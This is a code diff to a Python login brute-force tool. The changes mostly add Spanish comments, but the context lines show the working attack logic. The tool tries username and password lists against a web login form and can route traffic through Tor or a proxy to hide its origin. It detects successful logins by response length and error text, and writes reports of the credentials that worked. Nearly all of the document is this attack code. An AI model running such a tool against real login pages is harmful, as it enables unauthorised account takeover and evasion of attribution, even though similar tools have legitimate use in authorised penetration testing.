@@ -9,7 +9,7 @@ import socks # Tor
 import random
 import time
 
-start_time = time.time()
+start_time = time.time() #Tiempo de ejecucion del programa
 def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,report,valUrl,th):
 	
 	b = ['','1','12']
@@ -19,7 +19,7 @@ def checkFile(reqFile,user,pwd,message,verbose,cookie,agent,proxip,proxport,tor,
 	
 	print colored("\nBeginning BruteForce with Request File", 'cyan')
 	warning = raw_input('Please check that the arguments you gave to the tool are correct, Do you continue? [Y/n]') or 'Y'
-	if 'Y' in warning or 'y' in warning:
+	if 'Y' in warning or 'y' in warning: #Validacion de los parametros de entrada
 		pass
 	else:
 		error = """
@@ -55,7 +55,7 @@ Advices to check the arguments:
 		print colored('The file doesn\'t exists', 'green')
 		sys.exit(2)
 	
-	if valUrl in url:
+	if valUrl in url: #Validacion de la url con el parametro encontrado en el archivo
 		pass
 	else:
 		print colored('The url: ','yellow') + colored(valUrl,'blue') + colored(' doesn\'t match with: ','yellow') + colored(url,'blue')
@@ -64,7 +64,7 @@ Advices to check the arguments:
 	
 	
 	print colored('Username field is: ','yellow') + colored(userField,'blue') + colored(' Password field is: ','yellow') + colored(passField,'blue')
-	ask = raw_input('Are those values correct and Can we continue? [Y/n]') or 'Y'
+	ask = raw_input('Are those values correct and Can we continue? [Y/n]') or 'Y' #Validacion de los campos de usuario y password
 	if 'Y' in ask or 'y' in ask:
 		pass
 	else:
@@ -87,7 +87,7 @@ Advices to get the correct values in the file:
 		
 	
 	requests.packages.urllib3.disable_warnings()
-	if len(proxy) == 1:
+	if len(proxy) == 1: 
 		if tor == True: # Peticiones a traves de Tor
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 			socket.socket = socks.socksocket
@@ -105,7 +105,7 @@ Advices to get the correct values in the file:
 			except:
 				print colored('It can\'t contact with the login page','green')
 				sys.exit(2)
-		else:
+		else: #Manejo de errores peticion normal
 			try:
 				req = requests.get(url,verify=False)
 			except requests.exceptions.ConnectionError:
@@ -144,7 +144,7 @@ Advices to get the correct values in the file:
 			else:
 				pass
 		
-		if cookie is None:
+		if cookie is None: #Cookie aleatoria
 			alp = ['a','b','c','d','e','f','g','h','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0']
 			cook = []
 			while len(cook) < 26:
@@ -157,7 +157,7 @@ Advices to get the correct values in the file:
 		jar = cookie.split(',')
 		cookies = {jar[0]:jar[1]}
 		
-	if agent is None:
+	if agent is None: #user agent por defecto
 		agent = 'Mozilla/5.0 (PLAYSTATION 3;3.55)'
 		headers = {'user-agent': agent}
 	else:
@@ -168,7 +168,7 @@ Advices to get the correct values in the file:
 	for element in b: # Se realizan las peticiones para validar que parametros regresa el sitio
 		payload = {userField : element, passField: ''}
 		if len(proxy) == 1:
-			if tor == True:
+			if tor == True: #Manejo de errores de tor
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 				socket.socket = socks.socksocket
 				try:
@@ -185,7 +185,7 @@ Advices to get the correct values in the file:
 				except:
 					print colored('It can\'t contact with the login page','green')
 					sys.exit(2)
-			else:
+			else: #Manejo de errores peticion normal
 				try:
 					req = requests.post(url,payload, cookies = cookies, headers = headers, verify=False)
 				except requests.exceptions.ConnectionError:
@@ -200,7 +200,7 @@ Advices to get the correct values in the file:
 				except:
 					print colored('It can\'t contact with the login page','green')
 					sys.exit(2)
-		else:
+		else: #Manejo de errores del proxy
 			try:
 				req = requests.post(url,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 			except requests.exceptions.ConnectionError:
@@ -219,7 +219,7 @@ Advices to get the correct values in the file:
 	
 	if os.path.exists(user): #archivo con usuarios
 		print colored('There\'s a file named: ','yellow') + colored(user,'blue') + colored(' as an user argument.','yellow')
-		ask = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y'
+		ask = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y' #Validacion del archivo de usuario como parametro
 		if 'Y' in ask or 'y' in ask:
 			u = 1
 		else:
@@ -229,7 +229,7 @@ Advices to get the correct values in the file:
 	
 	if os.path.exists(pwd):
 		print colored('There\'s a file named: ','yellow') + colored(pwd,'blue') + colored(' as a password argument.','yellow')
-		askp = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y'
+		askp = raw_input('Do you want to make the attack with the file? [Y/n]') or 'Y' #Validacion del archivo de passwords como parametro
 		if 'Y' in askp or 'y' in askp:
 			p = 1  
 		else:
@@ -237,13 +237,13 @@ Advices to get the correct values in the file:
 	else:
 		p = 0
 		
-	if u == 1 and p == 1:
-		doubleFile(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
-	elif u == 1 and p == 0:
+	if u == 1 and p == 1: #Ambos archivos
+		doubleFile(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report) 
+	elif u == 1 and p == 0: #Archivo de usuarios
 		usersFile(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
-	elif u == 0 and p == 1:
+	elif u == 0 and p == 1: #Archivo de passwords
 		pwdFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,a,tor,report)
-	elif u == 0 and p == 0:
+	elif u == 0 and p == 0: #Sin archivos
 		single(url,userField,passField,user,pwd,message,verbose,cookies,headers,proxy,proxies,a,tor,report)
 	else:
 		print colored('Sorry, something is wrong :(','green')
@@ -260,7 +260,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 	payload = { userField : user, passField: pwd} # Carga del payload
 	
 	if len(proxy) == 1:
-		if tor == True:
+		if tor == True: #Manejo de errores de tor
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 			socket.socket = socks.socksocket
 			try:
@@ -277,7 +277,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 			except:
 				print colored('It can\'t contact with the login page','green')
 				sys.exit(2)
-		else:
+		else: #Manejo de errores peticion normal
 			try:
 				r = requests.post(url, payload,cookies = cookies, headers = headers, verify=False)
 			except requests.exceptions.ConnectionError:
@@ -292,7 +292,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 			except:
 				print colored('It can\'t contact with the login page','green')
 				sys.exit(2)
-	else:
+	else: #Manejo de errores del proxy
 		try:
 			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 		except requests.exceptions.ConnectionError:
@@ -309,7 +309,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 			sys.exit(2)
 	
 	if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
+		if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
 				l.append(user)
@@ -323,7 +323,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 				l.append(':)')
 	
 	elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-		if int(len(r.content)) == list[0] and mbefore in r.content:
+		if int(len(r.content)) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
 				l.append(user)
@@ -336,7 +336,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 				l.append(pwd)
 				l.append(':)')
 	else: # Si no se puede determinar mediante content-lenght
-		if mbefore in r.text:
+		if mbefore in r.text: #Validacion del mensaje de error en la respuesta
 			if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 				print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(pwd,'yellow')
 				l.append(user)
@@ -350,7 +350,7 @@ def single(url, userField, passField, user, pwd, message,verbose,cookies,headers
 				l.append(':)')
 	rep(report,l,url,userField,passField)
 
-def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report):
+def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): #Archivo de usuarios
 	users = []
 	l = []
 	requests.packages.urllib3.disable_warnings()		
@@ -367,7 +367,7 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 			#Login
 			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
 			if len(proxy) == 1:
-				if tor == True:
+				if tor == True: #Manejo de errores de tor
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 					socket.socket = socks.socksocket
 					try:
@@ -384,7 +384,7 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 					except:
 						print colored('It can\'t contact with the login page','green')
 						sys.exit(2)
-				else:
+				else: #Manejo de errores peticion normal
 					try:
 						r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
 					except requests.exceptions.ConnectionError:
@@ -399,7 +399,7 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 					except:
 						print colored('It can\'t contact with the login page','green')
 						sys.exit(2)
-			else:
+			else: #Manejo de errores del proxy
 				try:
 					r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 				except requests.exceptions.ConnectionError:
@@ -416,8 +416,8 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 					sys.exit(2)
 			
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
-					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
+				if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
+					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3: 
 						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
 						l.append(users[i].rstrip('\n'))
 						l.append(pwd)
@@ -431,7 +431,7 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 	
 	
 			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-				if int(len(r.content)) == list[0] or mbefore in r.content:
+				if int(len(r.content)) == list[0] or mbefore in r.content: #Validacion del mensaje de error en la respuesta
 					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
 						l.append(users[i].rstrip('\n'))
@@ -446,7 +446,7 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 	
 	
 			else: # Si no se puede determinar mediante content-lenght
-				if mbefore in r.text:
+				if mbefore in r.text: #Validacion del mensaje de error en la respuesta
 					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(pwd,'yellow')
 						l.append(users[i].rstrip('\n'))
@@ -460,13 +460,13 @@ def usersFile(url, userField, passField, user, pwd, message,verbose,cookies,head
 						l.append(':)')
 	rep(report,l,url,userField,passField)	
 
-def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,headers,proxy,proxies,list, tor,report):
+def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,headers,proxy,proxies,list, tor,report): #Archivo de passwords
 	
 	passwords = []
 	l = []
 	requests.packages.urllib3.disable_warnings()		
 	
-	if os.path.exists(pwd): #archivo con usuarios
+	if os.path.exists(pwd): #archivo con passwords
 		fo = open(pwd, 'r')
 		for element in fo:
 			passwords.append(element)
@@ -480,7 +480,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 			payload = { userField : user, passField: passwords[i].rstrip('\n')} # Carga del payload
 			
 			if len(proxy) == 1:
-				if tor == True:
+				if tor == True: #Manejo de errores de tor
 					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 					socket.socket = socks.socksocket 
 					proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
@@ -498,7 +498,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 					except:
 						print colored('It can\'t contact with the login page','green')
 						sys.exit(2)
-				else:
+				else: #Manejo de errores peticion normal
 					try:
 						r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
 					except requests.exceptions.ConnectionError:
@@ -513,7 +513,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 					except:
 						print colored('It can\'t contact with the login page','green')
 						sys.exit(2)
-			else:
+			else: #Manejo de errores del proxy
 				try:
 					r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 				except requests.exceptions.ConnectionError:
@@ -530,7 +530,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 					sys.exit(2)
 		
 			if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content:
+				if int(len(r.content)) - int(len(user)) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
 						l.append(user)
@@ -544,7 +544,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 						l.append(':)')
 			
 			elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-				if int(len(r.content)) == list[0] and mbefore in r.content:
+				if int(len(r.content)) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 						print colored('Attack not successfully  with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
 						l.append(user)
@@ -558,7 +558,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 						l.append(':)')
 					
 			else: # Si no se puede determinar mediante content-lenght
-				if mbefore in r.text:
+				if mbefore in r.text: #Validacion del mensaje de error en la respuesta
 					if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 						print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(user,'yellow') + ' Password: ' + colored(passwords[i].rstrip('\n'),'yellow')
 						l.append(user)
@@ -572,7 +572,7 @@ def pwdFile(url, userField, passField, user, pwd,  message,verbose,cookies,heade
 						l.append(':)')
 	rep(report,l,url,userField,passField)
 
-def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report):
+def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,headers,proxy,proxies,list,tor,report): #Ambos archivos
 	l = []
 	users = []
 	passwords = []
@@ -583,12 +583,12 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 	
 	if os.path.exists(user) and os.path.exists(pwd): # ambos archivos
 		
-		fo = open(user, 'r')
+		fo = open(user, 'r') #Archivo de usuarios
 		for element in fo:
 			users.append(element)
 		fo.close()
 		
-		fo = open(pwd, 'r')
+		fo = open(pwd, 'r') #Archivo de passwords
 		for element in fo:
 			passwords.append(element)
 		fo.close()
@@ -602,7 +602,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 				
 				payload = { userField : users[i].rstrip('\n'), passField: passwords[j].rstrip('\n')}
 				if len(proxy) == 1:
-					if tor == True:
+					if tor == True: #Manejo de errores de tor
 						socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 						socket.socket = socks.socksocket
 						proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
@@ -620,7 +620,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						except:
 							print colored('It can\'t contact with the login page','green')
 							sys.exit(2)
-					else:
+					else: #Manejo de errores peticion normal
 						try:
 							r = requests.post(url, data = payload,cookies = cookies, headers = headers, verify=False)
 						except requests.exceptions.ConnectionError:
@@ -635,7 +635,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						except:
 							print colored('It can\'t contact with the login page','green')
 							sys.exit(2)
-				else:
+				else: #Manejo de errores del proxy
 					try:
 						r = requests.post(url, data = payload,cookies = cookies, headers = headers,proxies = proxies,verify=False)
 					except requests.exceptions.ConnectionError:
@@ -652,7 +652,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						sys.exit(2)
 					
 				if list[1] - 1 == list[0] and list[2] -2 == list[0]: # Si en la respuesta devuelve el nombre de usuario
-					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content:
+					if int(len(r.content)) - int(len(users[i])-1) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
 							#l.append('Attack not successfully with: ' + 'User: ' + users[i].rstip('\n') + ' Password: ' + passwords[j].rstrip('\n'))
@@ -673,7 +673,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						j + 1
 						
 				elif list[0] == list[1] and list[0] == list[2]: # Si el Content-Lenght es igual
-					if int(len(r.content)) == list[0] and mbefore in r.content:
+					if int(len(r.content)) == list[0] and mbefore in r.content: #Validacion del mensaje de error en la respuesta
 						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
 							l.append(users[i])
@@ -691,7 +691,7 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						
 						j + 1
 				else: # Si no se puede determinar mediante content-lenght
-					if mbefore in r.text:
+					if mbefore in r.text: #Validacion del mensaje de error en la respuesta
 						if int(verbose) == 1 or int(verbose) == 2 or int(verbose) == 3:
 							print colored('Attack not successfully with: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
 							l.append(users[i])
@@ -710,21 +710,8 @@ def doubleFile(url, userField, passField, user, pwd, message,verbose,cookies,hea
 						j + 1
 		i + 1	
 	rep(report,l,url,userField,passField)
-'''
-def rep(list1,list2):
-	for value in list1:
-		if list1.index(value) == 0:
-			t = time.strftime('%d-%m-%Y')
-			h = time.strftime('%H:%M:%S')
-			fo = open(('BruteForceReport_' + t + '_'+ h + '.txt'), 'wb')
-			fo.write('Results from the site\n')
-			for element in list2:
-				fo.write(element + '\n')
-			fo.close()
-		else:
-			pass
-'''
-def rep(list1,list2,url,userField,passField):
+
+def rep(list1,list2,url,userField,passField): #Reporte
 	title = ' *** Bruterfoce Results ***'
 	execution =  ('Execution time was: %s seconds' % (time.time() - start_time))
 	resource = 'Resource: ' + str(url)
@@ -736,7 +723,7 @@ def rep(list1,list2,url,userField,passField):
 	h = time.strftime('%H:%M:%S')
 	
 	for value in list1:
-		if 'text' in value:
+		if 'text' in value: #Texto plano
 			fo = open(('BruteForceReport_' + t + '_'+ h + '.txt'), 'wb')
 			fo.write(title.center(100) + '\n')
 			fo.write('' + '\n')
@@ -760,7 +747,7 @@ def rep(list1,list2,url,userField,passField):
 				list2.pop(1)
 				list2.pop(0)
 			fo.close()
-		elif 'html'.upper() in value or 'html' in value:			
+		elif 'html'.upper() in value or 'html' in value: #HTML
 			fo = open(('BruteForceReport_' + t + '_'+ h + '.html'), 'wb')
 			
 			header = """
@@ -822,7 +809,7 @@ def rep(list1,list2,url,userField,passField):
 			</html>""")
 			fo.close()
 		
-		elif 'xml'.upper() in value or 'xml' in value:			
+		elif 'xml'.upper() in value or 'xml' in value:	#XML
 			fo = open(('BruteForceReport_' + t + '_'+ h + '.xml'), 'wb')
 			
 			header = """<?xml version="1.0" encoding="UTF-8"?>
